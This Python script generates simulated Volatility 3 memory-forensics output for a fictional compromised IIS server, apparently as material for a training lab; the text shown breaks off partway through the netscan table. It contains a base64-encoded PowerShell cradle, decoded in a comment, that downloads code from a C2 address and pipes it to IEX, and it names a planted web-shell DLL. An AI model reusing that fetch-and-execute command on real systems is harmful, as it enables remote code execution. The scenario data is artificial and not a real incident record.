#!/usr/bin/env python3
"""Deterministic generator for the simulated WEB-APP-03 memory dataset.

Attack narrative
================
WEB-APP-03 is a Windows Server 2019 internal application server hosting
an IIS line-of-business web application. It is part of the same incident
as ``WKSTN-221``: the SOC found that the same C2 IP (``91.214.47.22``)
that beaconed from the workstation also showed up in netflow from the
server later that week, and pivoted onto WEB-APP-03 looking for
follow-on activity.

At ``10:18:42 UTC`` on ``2024-11-21`` an IIS worker process
(``w3wp.exe``, PID 2860, AppPool1) spawned two shells in the same
second, both as its direct children: an interactive ``cmd.exe``
(PID 3580, no arguments, with its own ``conhost.exe`` 3612) and
``powershell.exe`` (PID 3704) with
``-NoProfile -WindowStyle Hidden -EncodedCommand <base64>``. The
encoded command is a short ``Invoke-WebRequest`` cradle to
``https://91.214.47.22:443/agent | IEX``. At ``10:19:01`` the
suspicious ``powershell.exe`` established an outbound TCP/443 socket to
the same C2. At ``10:19:14`` an unsigned ``cmdshell.dll`` was loaded
into the ``w3wp.exe`` worker from ``C:\\Windows\\Temp\\``. A short-lived
service ``WindowsHealthCollector`` (binary ``C:\\Windows\\Temp\\whcs.exe``)
ran as ``whcs.exe`` (PID 3756) under ``services.exe`` from ``10:21:30``
to ``10:23:11`` and is now stopped. WinPmem 4.0.rc1 was started at
``10:42:08`` to capture memory; the image's ``SystemTime`` is
``10:42:11``. That image is the source of the Volatility 3 plugin
output reproduced by this script.

The dataset contains:
  - the suspicious process tree ``w3wp.exe -> cmd.exe`` and
    ``w3wp.exe -> powershell.exe`` (siblings, not a chain)
  - the suspicious powershell command line with EncodedCommand
  - one C2 socket (PID 3704 -> 91.214.47.22:443)
  - three malfind hits: powershell.exe (3704), svchost.exe (1142), w3wp.exe (2860)
  - cmdshell.dll loaded into w3wp.exe from C:\\Windows\\Temp\\
  - handles in PID 3704 to whcs.exe, cmdshell.dll, and a named pipe whcs_ctrl
  - the WindowsHealthCollector service in SERVICE_STOPPED state

Output format
=============
Volatility 3's plain-text renderer joins fields with single TAB
characters and writes a leading two-line banner
(``Volatility 3 Framework 2.5.2`` + the ``Progress:`` line), then the
header, then a blank line, then data rows. The committed dataset has
the tabs *expanded at tabstop=8*, so this generator does the same:
each row is built as ``"\\t".join(fields)`` and then ``.expandtabs(8)``
is applied at write time. Output is byte-identical to the committed
files given the same ``RANDOM_SEED``.

Usage
=====
    python3 generate.py                     # write files in current dir
    python3 generate.py --dry-run           # print plan only
    python3 generate.py --out-dir /tmp/x    # write to scratch dir
"""

from __future__ import annotations

import argparse
import hashlib
import random
import struct
import sys
import zlib
from pathlib import Path
from typing import Callable, Dict, List, Tuple, Union

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

# Fixed seed -> byte-identical output across runs. Mirrors the WKSTN-221
# generator's "hostname as hex" convention: letters of "WEBAPP03" mapped to
# legal hex digits (W->0, E->E, B->B, A->A, P->5, P->5, 0->0, 3->3) so the
# constant reads "0EBAA5503". Override with --seed for a different stream.
RANDOM_SEED = 0x0EBAA5503

HOSTNAME = "WEB-APP-03"
HOST_IP = "10.0.8.34"
C2_IP = "91.214.47.22"             # shared with WKSTN-221 (intentional)
APP_POOL = "AppPool1"
W3WP_PID = 2860
W3WP_PPID = 2712                   # WAS.exe (Windows Process Activation Service)
CMD_PID = 3580
PS_PID = 3704
PS_CONHOST_PID = 3612
INJECTED_SVCHOST_PID = 1142        # destination of cross-proc injection
WHCS_SVC = "WindowsHealthCollector"
WHCS_BIN = "C:\\Windows\\Temp\\whcs.exe"
# Simplification: real IIS hosts WAS and W3SVC together in one
# ``svchost.exe -k iissvcs``. This dataset models WAS as its own WAS.exe
# process (PID 2712, w3wp.exe's parent); its image path in cmdline and
# its svcscan binary path must both name that same WAS.exe image.
WAS_BIN = "C:\\Windows\\System32\\inetsrv\\WAS.exe"
CMDSHELL_DLL = "C:\\Windows\\Temp\\cmdshell.dll"
IIS_PIPE = "iisipm89af2c9b-5d7e-4f26-9b8a-6f9b3c9e7d24"
ACQ_TIME = "2024-11-21 10:42:11"


def _apppool_sid(pool: str) -> str:
    """SID of the ``IIS APPPOOL\\<pool>`` virtual account.

    Windows derives it as ``S-1-5-82-`` followed by the SHA-1 of the
    lower-cased pool name (UTF-16-LE), read as five little-endian
    32-bit integers. ``defaultapppool`` gives the familiar
    ``S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415``.
    The powershell.exe child of the AppPool1 worker inherits this
    identity, so its HKU handle must name AppPool1's SID.
    """
    digest = hashlib.sha1(pool.lower().encode("utf-16-le")).digest()
    return "S-1-5-82-" + "-".join(str(x) for x in struct.unpack("<5I", digest))


APP_POOL_SID = _apppool_sid(APP_POOL)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

# A "block" is either a list of field strings (to be tab-joined and
# expanded) or a raw pre-formatted line. We model the entire file as a
# sequence of blocks plus a final newline.
Row = Union[List[str], str]


def row(*fields: str) -> List[str]:
    """Convenience: build a tab-row from positional field values."""
    return [str(f) for f in fields]


def render(blocks: List[Row]) -> str:
    """Render blocks into the final file content.

    Lists of fields are tab-joined; strings pass through unchanged. The
    whole result is then ``expandtabs(8)``-ed to match Volatility 3's
    default tab-stop. A trailing newline is added so the file ends with
    ``\\n`` (matches the committed dataset).
    """
    lines: List[str] = []
    for b in blocks:
        if isinstance(b, list):
            lines.append("\t".join(b))
        else:
            lines.append(b)
    return ("\n".join(lines) + "\n").expandtabs(8)


# The two-line Volatility banner is identical across every plugin output
# in this dataset. Keep it as a constant so the per-file generators stay
# focused on their actual content.
BANNER = [
    "Volatility 3 Framework 2.5.2",
    # The Progress line: 17 chars of "Progress:  100.00", then 15
    # literal spaces (Volatility's own carriage-return padding from the
    # progress widget), then "PDB scanning finished".
    "Progress:  100.00" + " " * 15 + "PDB scanning finished",
]


# ---------------------------------------------------------------------------
# windows.info
# ---------------------------------------------------------------------------

def generate_info(rng: random.Random) -> str:
    blocks: List[Row] = list(BANNER)
    blocks.append("")
    blocks.append(row("Variable", "Value"))
    blocks.append("")
    blocks.append(row("Kernel Base", "0xf8042b400000"))
    blocks.append(row("DTB", "0x1ad000"))
    blocks.append(row(
        "Symbols",
        "file:///opt/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/"
        "3FBDD09B7E10F18B85C0F0B0CCB0F31D-1.json.xz",
    ))
    blocks.append(row("Is64Bit", "True"))
    blocks.append(row("IsPAE", "False"))
    blocks.append(row("layer_name", "0 WindowsIntel32e"))
    blocks.append(row("memory_layer", "1 FileLayer"))
    blocks.append(row("KdVersionBlock", "0xf8042b427108"))
    blocks.append(row("Major/Minor", "15.17763"))
    blocks.append(row("MachineType", "34404"))
    blocks.append(row("KeNumberProcessors", "4"))
    blocks.append(row("SystemTime", ACQ_TIME))
    blocks.append(row("NtSystemRoot", "C:\\Windows"))
    blocks.append(row("NtProductType", "NtProductLanManNt"))
    blocks.append(row("NtMajorVersion", "10"))
    blocks.append(row("NtMinorVersion", "0"))
    blocks.append(row("PE MajorOperatingSystemVersion", "10"))
    blocks.append(row("PE MinorOperatingSystemVersion", "0"))
    blocks.append(row("PE Machine", "34404"))
    blocks.append(row("PE TimeDateStamp", "Sat Sep 15 07:28:02 2018"))
    blocks.append(row("NTBuildLab", "17763.1.amd64fre.rs5_release.180914-1434"))
    # CSDVersion is empty in the original — emit the bare key (no tab).
    blocks.append("CSDVersion")
    blocks.append(row("ProductName", "Windows Server 2019 Datacenter"))
    blocks.append(row("NtBuildNumber", "17763"))
    blocks.append(row(
        "NtBuildLabEx",
        "17763.5329.amd64fre.rs5_release_svc_prod1.240106-1700",
    ))
    blocks.append(row("KdDebuggerDataBlock", "0xf8042b424b30"))
    blocks.append(row("PsActiveProcessHead", "0xf8042b4376a0"))
    blocks.append(row("PsLoadedModuleList", "0xf8042b446340"))
    blocks.append(row("KernelFileName", "ntoskrnl.exe"))
    return render(blocks)


# ---------------------------------------------------------------------------
# Process table (shared between pslist and pstree)
# ---------------------------------------------------------------------------

# Each tuple: (pid, ppid, name, offset, threads, sessionid, wow64,
# create, exit). Handles is "-" everywhere in the committed file (no
# argument was passed). The tree column for pstree is derived from
# parent/child relationships and the order below preserves the visible
# tree shape of the committed file.

# (pid, ppid, name, offset, threads, sessionid, wow64, create, exit)
#
# PPIDs 428 and 516 (parents of csrss.exe 436/532 and wininit.exe 524)
# are absent on purpose: they are the per-session smss.exe instances,
# which exit once their session is started. Every other PPID is listed,
# and every child's CreateTime is at or after its parent's.
PROCS: List[Tuple[int, int, str, str, int, str, str, str, str]] = [
    (4,    0,    "System",              "0xa1820e07d040", 148, "N/A", "False", "2024-11-21 06:30:02.000000", "N/A"),
    (72,   4,    "Registry",            "0xa1820e0a3080", 4,   "N/A", "False", "2024-11-21 06:30:02.000000", "N/A"),
    (348,  4,    "smss.exe",            "0xa1820f6c0040", 2,   "N/A", "False", "2024-11-21 06:30:02.000000", "N/A"),
    (436,  428,  "csrss.exe",           "0xa18210f47140", 10,  "0",   "False", "2024-11-21 06:30:08.000000", "N/A"),
    (524,  516,  "wininit.exe",         "0xa18210f96080", 1,   "0",   "False", "2024-11-21 06:30:09.000000", "N/A"),
    (532,  516,  "csrss.exe",           "0xa18210fa6080", 11,  "1",   "False", "2024-11-21 06:30:09.000000", "N/A"),
    (596,  524,  "services.exe",        "0xa182111ad080", 6,   "0",   "False", "2024-11-21 06:30:09.000000", "N/A"),
    (604,  524,  "lsass.exe",           "0xa182111c8080", 9,   "0",   "False", "2024-11-21 06:30:09.000000", "N/A"),
    (640,  524,  "winlogon.exe",        "0xa18211214080", 3,   "1",   "False", "2024-11-21 06:30:09.000000", "N/A"),
    (672,  524,  "fontdrvhost.exe",     "0xa1821121c080", 5,   "0",   "False", "2024-11-21 06:30:10.000000", "N/A"),
    (720,  596,  "svchost.exe",         "0xa1821126b080", 18,  "0",   "False", "2024-11-21 06:30:10.000000", "N/A"),
    (748,  596,  "svchost.exe",         "0xa18211278080", 6,   "0",   "False", "2024-11-21 06:30:10.000000", "N/A"),
    (800,  596,  "svchost.exe",         "0xa182112a4080", 20,  "0",   "False", "2024-11-21 06:30:10.000000", "N/A"),
    (856,  596,  "svchost.exe",         "0xa182112b1080", 9,   "0",   "False", "2024-11-21 06:30:10.000000", "N/A"),
    (904,  596,  "svchost.exe",         "0xa182112c1080", 10,  "0",   "False", "2024-11-21 06:30:10.000000", "N/A"),
    (944,  596,  "svchost.exe",         "0xa182112d2080", 19,  "0",   "False", "2024-11-21 06:30:10.000000", "N/A"),
    (988,  596,  "svchost.exe",         "0xa182112e0080", 8,   "0",   "False", "2024-11-21 06:30:10.000000", "N/A"),
    (1024, 596,  "svchost.exe",         "0xa182112ee080", 15,  "0",   "False", "2024-11-21 06:30:10.000000", "N/A"),
    (1080, 596,  "svchost.exe",         "0xa18211314080", 7,   "0",   "False", "2024-11-21 06:30:10.000000", "N/A"),
    (1142, 596,  "svchost.exe",         "0xa18211327080", 11,  "0",   "False", "2024-11-21 06:30:11.000000", "N/A"),
    (1196, 596,  "svchost.exe",         "0xa18211342080", 6,   "0",   "False", "2024-11-21 06:30:11.000000", "N/A"),
    (1244, 596,  "svchost.exe",         "0xa18211358080", 12,  "0",   "False", "2024-11-21 06:30:11.000000", "N/A"),
    (1308, 596,  "svchost.exe",         "0xa1821136f080", 9,   "0",   "False", "2024-11-21 06:30:11.000000", "N/A"),
    (1372, 596,  "svchost.exe",         "0xa18211380080", 4,   "0",   "False", "2024-11-21 06:30:11.000000", "N/A"),
    (1448, 596,  "svchost.exe",         "0xa182113a1080", 13,  "0",   "False", "2024-11-21 06:30:11.000000", "N/A"),
    (1496, 596,  "spoolsv.exe",         "0xa182113b8080", 10,  "0",   "False", "2024-11-21 06:30:11.000000", "N/A"),
    (1572, 596,  "svchost.exe",         "0xa182113d4080", 7,   "0",   "False", "2024-11-21 06:30:12.000000", "N/A"),
    (1604, 596,  "svchost.exe",         "0xa182113e2080", 6,   "0",   "False", "2024-11-21 06:30:12.000000", "N/A"),
    (1648, 596,  "svchost.exe",         "0xa182113f1080", 5,   "0",   "False", "2024-11-21 06:30:12.000000", "N/A"),
    (1696, 596,  "MsMpEng.exe",         "0xa182113ff080", 18,  "0",   "False", "2024-11-21 06:30:12.000000", "N/A"),
    (1752, 596,  "svchost.exe",         "0xa18211420080", 6,   "0",   "False", "2024-11-21 06:30:12.000000", "N/A"),
    (1812, 596,  "svchost.exe",         "0xa1821143d080", 10,  "0",   "False", "2024-11-21 06:30:12.000000", "N/A"),
    (1884, 596,  "svchost.exe",         "0xa1821145e080", 4,   "0",   "False", "2024-11-21 06:30:12.000000", "N/A"),
    (1948, 596,  "WmiPrvSE.exe",        "0xa18211479080", 9,   "0",   "False", "2024-11-21 06:30:13.000000", "N/A"),
    (2004, 596,  "svchost.exe",         "0xa18211492080", 8,   "0",   "False", "2024-11-21 06:30:13.000000", "N/A"),
    (2068, 596,  "dllhost.exe",         "0xa182114a8080", 6,   "0",   "False", "2024-11-21 06:30:13.000000", "N/A"),
    (2148, 640,  "dwm.exe",             "0xa182114c2080", 10,  "1",   "False", "2024-11-21 06:30:13.000000", "N/A"),
    (2244, 524,  "LogonUI.exe",         "0xa182114e8080", 6,   "1",   "False", "2024-11-21 06:30:13.000000", "N/A"),
    (2316, 596,  "svchost.exe",         "0xa18211506080", 5,   "0",   "False", "2024-11-21 06:30:14.000000", "N/A"),
    (2380, 596,  "SearchIndexer.exe",   "0xa1821151f080", 14,  "0",   "False", "2024-11-21 06:30:14.000000", "N/A"),
    (2452, 596,  "WaaSMedicAgent.exe",  "0xa1821153d080", 4,   "0",   "False", "2024-11-21 06:30:14.000000", "N/A"),
    (2516, 596,  "svchost.exe",         "0xa18211556080", 3,   "0",   "False", "2024-11-21 06:30:14.000000", "N/A"),
    (2588, 944,  "taskhostw.exe",       "0xa18211572080", 9,   "1",   "False", "2024-11-21 06:30:14.000000", "N/A"),
    (2644, 596,  "msdtc.exe",           "0xa18211588080", 11,  "0",   "False", "2024-11-21 06:30:14.000000", "N/A"),
    (2712, 596,  "WAS.exe",             "0xa1821159b080", 7,   "0",   "False", "2024-11-21 06:30:14.000000", "N/A"),
    (2780, 596,  "svchost.exe",         "0xa182115b1080", 6,   "0",   "False", "2024-11-21 06:30:14.000000", "N/A"),
    (2860, 2712, "w3wp.exe",            "0xa182115c8080", 28,  "0",   "False", "2024-11-21 09:00:14.000000", "N/A"),
    (3024, 596,  "conhost.exe",         "0xa18211608080", 4,   "0",   "False", "2024-11-21 09:00:14.000000", "N/A"),
    (3192, 596,  "svchost.exe",         "0xa18211641080", 5,   "0",   "False", "2024-11-21 09:14:33.000000", "N/A"),
    (3408, 596,  "svchost.exe",         "0xa18211687080", 4,   "0",   "False", "2024-11-21 09:42:01.000000", "N/A"),
    (3580, 2860, "cmd.exe",             "0xa182116c4080", 1,   "0",   "False", "2024-11-21 10:18:42.000000", "N/A"),
    (3612, 3580, "conhost.exe",         "0xa182116d2080", 3,   "0",   "False", "2024-11-21 10:18:42.000000", "N/A"),
    (3704, 2860, "powershell.exe",      "0xa182116f1080", 9,   "0",   "False", "2024-11-21 10:18:42.000000", "N/A"),
    # whcs.exe — the WindowsHealthCollector service binary
    # (SERVICE_WIN32_OWN_PROCESS, C:\Windows\Temp\whcs.exe), started by
    # services.exe and stopped within the capture window. Exit time
    # present; svcscan shows the service SERVICE_STOPPED with no PID.
    (3756, 596,  "whcs.exe",            "0xa18211712080", 4,   "0",   "False", "2024-11-21 10:21:30.000000", "2024-11-21 10:23:11.000000"),
    (3892, 2380, "SearchProtocolHost.exe", "0xa18211735080", 6, "0",  "False", "2024-11-21 10:31:18.000000", "N/A"),
    (3948, 2380, "SearchFilterHost.exe", "0xa18211748080", 4,  "0",   "False", "2024-11-21 10:31:18.000000", "N/A"),
    (4012, 596,  "WmiPrvSE.exe",        "0xa18211760080", 7,   "0",   "False", "2024-11-21 10:38:02.000000", "N/A"),
    (4088, 596,  "winpmem.exe",         "0xa18211782080", 3,   "0",   "False", "2024-11-21 10:42:08.000000", "N/A"),
]


def _proc_by_pid(pid: int) -> Tuple:
    for p in PROCS:
        if p[0] == pid:
            return p
    raise KeyError(pid)


# ---------------------------------------------------------------------------
# windows.pslist
# ---------------------------------------------------------------------------

def generate_pslist(rng: random.Random) -> str:
    blocks: List[Row] = list(BANNER)
    blocks.append("")
    blocks.append(row(
        "PID", "PPID", "ImageFileName", "Offset(V)", "Threads",
        "Handles", "SessionId", "Wow64", "CreateTime", "ExitTime",
        "File output",
    ))
    blocks.append("")
    # pslist preserves the natural creation order of PROCS. (Note: it
    # is *pstree* that moves PID 532 to the very end, not pslist —
    # because pstree's traversal walks parent->child trees and 532's
    # parent (516) is not in the active list, so it gets visited last.)
    for (pid, ppid, name, off, thr, sid, wow, ctime, etime) in PROCS:
        blocks.append(row(
            str(pid), str(ppid), name, off, str(thr), "-",
            sid, wow, ctime, etime, "Disabled",
        ))
    return render(blocks)


# ---------------------------------------------------------------------------
# windows.pstree
# ---------------------------------------------------------------------------

# pstree uses a "*" prefix per depth level, joined to the PID by a single
# space. The committed file's tree order is preserved verbatim below:
# each entry is (depth_stars, pid). depth == 0 means no prefix; depth == 1
# means "* ", etc. The depth_stars value already includes the trailing
# space (or is empty for depth 0) so we just concatenate it with the PID.
PSTREE_ORDER: List[Tuple[str, int]] = [
    ("",     4),
    ("* ",   72),
    ("* ",   348),
    ("",     436),
    ("",     524),
    ("* ",   596),
    ("** ",  720),
    ("** ",  748),
    ("** ",  800),
    ("** ",  856),
    ("** ",  904),
    ("** ",  944),
    ("*** ", 2588),
    ("** ",  988),
    ("** ",  1024),
    ("** ",  1080),
    ("** ",  1142),
    ("** ",  1196),
    ("** ",  1244),
    ("** ",  1308),
    ("** ",  1372),
    ("** ",  1448),
    ("** ",  1496),
    ("** ",  1572),
    ("** ",  1604),
    ("** ",  1648),
    ("** ",  1696),
    ("** ",  1752),
    ("** ",  1812),
    ("** ",  1884),
    ("** ",  1948),
    ("** ",  2004),
    ("** ",  2068),
    ("** ",  2316),
    ("** ",  2380),
    ("*** ", 3892),
    ("*** ", 3948),
    ("** ",  2452),
    ("** ",  2516),
    ("** ",  2644),
    ("** ",  2712),
    ("*** ", 2860),
    ("**** ",  3580),
    ("***** ", 3612),
    ("**** ",  3704),
    ("** ",  2780),
    ("** ",  3024),
    ("** ",  3192),
    ("** ",  3408),
    ("** ",  3756),
    ("** ",  4012),
    ("** ",  4088),
    ("* ",   604),
    ("* ",   640),
    ("** ",  2148),
    ("* ",   672),
    ("* ",   2244),
    ("",     532),
]


def generate_pstree(rng: random.Random) -> str:
    blocks: List[Row] = list(BANNER)
    blocks.append("")
    blocks.append(row(
        "PID", "PPID", "ImageFileName", "Offset(V)", "Threads",
        "Handles", "SessionId", "Wow64", "CreateTime", "ExitTime",
    ))
    blocks.append("")
    for prefix, pid in PSTREE_ORDER:
        (_, ppid, name, off, thr, sid, wow, ctime, etime) = _proc_by_pid(pid)
        blocks.append(row(
            f"{prefix}{pid}", str(ppid), name, off, str(thr), "-",
            sid, wow, ctime, etime,
        ))
    return render(blocks)


# ---------------------------------------------------------------------------
# windows.cmdline
# ---------------------------------------------------------------------------

# The base64 blob that the suspicious powershell.exe was launched with.
# Decodes to (UTF-16-LE):
#   Invoke-WebRequest -Uri 'https://91.214.47.22:443/agent'
#       -UseBasicParsing | IEX
# Decoding is left as a Lab 07 exercise — keep it intact here.
PS_ENCODED = (
    "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAg"
    "ACcAaAB0AHQAcABzADoALwAvADkAMQAuADIAMQA0AC4ANAA3AC4AMgAyADoA"
    "NAA0ADMALwBhAGcAZQBuAHQAJwAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQBy"
    "AHMAaQBuAGcAIAB8ACAASQBFAFgA"
)

# (pid, image_name, args). Args of "Required memory at 0x20 is not valid
# (process exited?)" is Volatility's marker for processes whose argument
# block could not be read — used for System/Registry and the
# exited whcs.exe 3756 in this dataset.
CMDLINES: List[Tuple[int, str, str]] = [
    (4,    "System",   "Required memory at 0x20 is not valid (process exited?)"),
    (72,   "Registry", "Required memory at 0x20 is not valid (process exited?)"),
    (348,  "smss.exe", "\\SystemRoot\\System32\\smss.exe"),
    (436,  "csrss.exe",
        "%SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows "
        "SharedSection=1024,20480,768 Windows=On SubSystemType=Windows "
        "ServerDll=basesrv,1 "
        "ServerDll=winsrv:UserServerDllInitialization,3 "
        "ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"),
    (524,  "wininit.exe", "wininit.exe"),
    (532,  "csrss.exe",
        "%SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows "
        "SharedSection=1024,20480,768 Windows=On SubSystemType=Windows "
        "ServerDll=basesrv,1 "
        "ServerDll=winsrv:UserServerDllInitialization,3 "
        "ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"),
    (596,  "services.exe",    "C:\\Windows\\system32\\services.exe"),
    (604,  "lsass.exe",       "C:\\Windows\\system32\\lsass.exe"),
    (640,  "winlogon.exe",    "winlogon.exe"),
    (672,  "fontdrvhost.exe", '"fontdrvhost.exe"'),
    (720,  "svchost.exe",     "C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p"),
    (748,  "svchost.exe",     "C:\\Windows\\system32\\svchost.exe -k RPCSS -p"),
    (800,  "svchost.exe",     "C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted -p -s EventLog"),
    (856,  "svchost.exe",     "C:\\Windows\\System32\\svchost.exe -k netsvcs -s LanmanServer"),
    (904,  "svchost.exe",     "C:\\Windows\\System32\\svchost.exe -k LocalSystemNetworkRestricted -p -s Netman"),
    (944,  "svchost.exe",     "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule"),
    (988,  "svchost.exe",     "C:\\Windows\\system32\\svchost.exe -k LocalService -p -s W32Time"),
    (1024, "svchost.exe",     "C:\\Windows\\system32\\svchost.exe -k DcomLaunch -s LSM"),
    (1080, "svchost.exe",     "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s ProfSvc"),
    (1142, "svchost.exe",     "C:\\Windows\\system32\\svchost.exe -k NetworkService -s Dnscache"),
    (1196, "svchost.exe",     "C:\\Windows\\system32\\svchost.exe -k LocalSystemNetworkRestricted -p -s WdiSystemHost"),
    (1244, "svchost.exe",     "C:\\Windows\\System32\\svchost.exe -k LocalServiceNoNetwork -p"),
    (1308, "svchost.exe",     "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Themes"),
    (1372, "svchost.exe",     "C:\\Windows\\system32\\svchost.exe -k LocalService -p -s EventSystem"),
    (1448, "svchost.exe",     "C:\\Windows\\System32\\svchost.exe -k NetworkService -s TermService"),
    (1496, "spoolsv.exe",     "C:\\Windows\\System32\\spoolsv.exe"),
    (1572, "svchost.exe",     "C:\\Windows\\system32\\svchost.exe -k LocalService -p"),
    (1604, "svchost.exe",     "C:\\Windows\\System32\\svchost.exe -k NetworkService -p -s WinRM"),
    (1648, "svchost.exe",     "C:\\Windows\\System32\\svchost.exe -k swprv"),
    (1696, "MsMpEng.exe",     '"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.23110.3-0\\MsMpEng.exe"'),
    (1752, "svchost.exe",     "C:\\Windows\\system32\\svchost.exe -k LocalService -p -s SstpSvc"),
    (1812, "svchost.exe",     "C:\\Windows\\system32\\svchost.exe -k LocalSystemNetworkRestricted -p -s TimeBrokerSvc"),
    (1884, "svchost.exe",     "C:\\Windows\\system32\\svchost.exe -k LocalService -p -s CDPUserSvc"),
    (1948, "WmiPrvSE.exe",    "C:\\Windows\\system32\\wbem\\wmiprvse.exe"),
    (2004, "svchost.exe",     "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Winmgmt"),
    (2068, "dllhost.exe",     "C:\\Windows\\system32\\DllHost.exe /Processid:{30D49246-D217-465F-AC8C-2DB0E5DDD06D}"),
    (2148, "dwm.exe",         '"dwm.exe"'),
    (2244, "LogonUI.exe",     '"LogonUI.exe" /flags:0x4 /state0:0xa39c5855 /state1:0x41c64e6d'),
    (2316, "svchost.exe",     "C:\\Windows\\System32\\svchost.exe -k LocalServiceAndNoImpersonation -p"),
    (2380, "SearchIndexer.exe", "C:\\Windows\\system32\\SearchIndexer.exe /Embedding"),
    (2452, "WaaSMedicAgent.exe",
        '"C:\\Windows\\System32\\WaaSMedicAgent.exe" '
        '6cf75db0-2bba-4d4e-a87d-3fc2c6308a82 '
        '7gXXBTzz9k+8nGn1cGPFNg== zMOpRMUPsk6kEU6gBY7VIw=='),
    (2516, "svchost.exe",     "C:\\Windows\\System32\\svchost.exe -k AppReadiness -p"),
    (2588, "taskhostw.exe",   "taskhostw.exe Activity"),
    (2644, "msdtc.exe",       "C:\\Windows\\System32\\msdtc.exe"),
    (2712, "WAS.exe",         WAS_BIN),
    (2780, "svchost.exe",     "C:\\Windows\\system32\\svchost.exe -k iissvcs"),
    (2860, "w3wp.exe",
        f"c:\\windows\\system32\\inetsrv\\w3wp.exe -ap \"{APP_POOL}\" "
        f"-v \"v4.0\" -l \"webengine4.dll\" -a \\\\.\\pipe\\{IIS_PIPE} "
        f"-h \"C:\\inetpub\\temp\\apppools\\{APP_POOL}\\{APP_POOL}.config\" "
        "-w \"\" -m 0"),
    (3024, "conhost.exe",     "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"),
    (3192, "svchost.exe",     "C:\\Windows\\System32\\svchost.exe -k wsappx -p -s ClipSVC"),
    (3408, "svchost.exe",     "C:\\Windows\\System32\\svchost.exe -k LocalService -p -s CDPSvc"),
    # The two shells w3wp.exe spawned at 10:18:42 — the heart of the
    # scenario. cmd.exe carries no arguments: an interactive shell the web shell
    # drives through redirected stdin/stdout. It cannot have launched
    # the PowerShell below — 3704's PPID is w3wp.exe (2860), not 3580,
    # and a ``cmd.exe /c powershell ...`` still running at capture would
    # have a live powershell.exe child, which the process list does not
    # show.
    (3580, "cmd.exe",         '"cmd.exe"'),
    (3612, "conhost.exe",
        "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"),
    (3704, "powershell.exe",
        "powershell.exe -NoProfile -WindowStyle Hidden "
        f"-EncodedCommand {PS_ENCODED}"),
    (3756, "whcs.exe",
        "Required memory at 0x20 is not valid (process exited?)"),
    (3892, "SearchProtocolHost.exe",
        '"C:\\Windows\\system32\\SearchProtocolHost.exe" '
        'Global\\UsGthrFltPipeMssGthrPipe_S-1-5-21-1124316434-2391045728-3041873789-2879_ '
        'Global\\UsGthrCtrlFltPipeMssGthrPipe_S-1-5-21-1124316434-2391045728-3041873789-2879 '
        '1 -2147483646 "Software\\Microsoft\\Windows Search" '
        '"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 7.0 Robot)" '
        '"C:\\ProgramData\\Microsoft\\Search\\Data\\Temp\\usgthrsvc"'),
    (3948, "SearchFilterHost.exe",
        '"C:\\Windows\\system32\\SearchFilterHost.exe" 0 568 572 580 65536 576'),
    (4012, "WmiPrvSE.exe",    "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding"),
    (4088, "winpmem.exe",     f"winpmem.exe -o E:\\Evidence\\{HOSTNAME}_memory.raw"),
]


def generate_cmdline(rng: random.Random) -> str:
    blocks: List[Row] = list(BANNER)
    blocks.append("")
    blocks.append(row("PID", "Process", "Args"))
    blocks.append("")
    for pid, name, args in CMDLINES:
        blocks.append(row(str(pid), name, args))
    return render(blocks)


# ---------------------------------------------------------------------------
# windows.netscan
# ---------------------------------------------------------------------------

# (offset, proto, laddr, lport, faddr, fport, state, pid, owner, created)
NETSCAN: List[Tuple[str, str, str, str, str, str, str, str, str, str]] = [
    # Listening sockets (IIS + SMB + RDP + WinRM + RPC + lsass + services)
    ("0xa18211a0c010", "TCPv4", "0.0.0.0",  "80",    "0.0.0.0", "0", "LISTENING",   "4",    "System",       "2024-11-21 06:30:14.000000"),
    ("0xa18211a0c180", "TCPv6", "::",       "80",    "::",      "0", "LISTENING",   "4",    "System",       "2024-11-21 06:30:14.000000"),
    ("0xa18211a0c2f0", "TCPv4", "0.0.0.0",  "443",   "0.0.0.0", "0", "LISTENING",   "4",    "System",       "2024-11-21 06:30:14.000000"),
    ("0xa18211a0c460", "TCPv6", "::",       "443",   "::",      "0", "LISTENING",   "4",    "System",       "2024-11-21 06:30:14.000000"),
    ("0xa18211a0c5d0", "TCPv4", "0.0.0.0",  "135",   "0.0.0.0", "0", "LISTENING",   "720",  "svchost.exe",  "2024-11-21 06:30:10.000000"),
    ("0xa18211a0c740", "TCPv6", "::",       "135",   "::",      "0", "LISTENING",   "720",  "svchost.exe",  "2024-11-21 06:30:10.000000"),
    ("0xa18211a0c8b0", "TCPv4", "0.0.0.0",  "445",   "0.0.0.0", "0", "LISTENING",   "4",    "System",       "2024-11-21 06:30:02.000000"),
    ("0xa18211a0ca20", "TCPv6", "::",       "445",   "::",      "0", "LISTENING",   "4",    "System",       "2024-11-21 06:30:02.000000"),
    ("0xa18211a0cb90", "TCPv4", "0.0.0.0",  "3389",  "0.0.0.0", "0", "LISTENING",   "1448", "svchost.exe",  "2024-11-21 06:30:11.000000"),
    ("0xa18211a0cd00", "TCPv6", "::",       "3389",  "::",      "0", "LISTENING",   "1448", "svchost.exe",  "2024-11-21 06:30:11.000000"),
    ("0xa18211a0ce70", "TCPv4", "0.0.0.0",  "5985",  "0.0.0.0", "0", "LISTENING",   "4",    "System",       "2024-11-21 06:30:14.000000"),
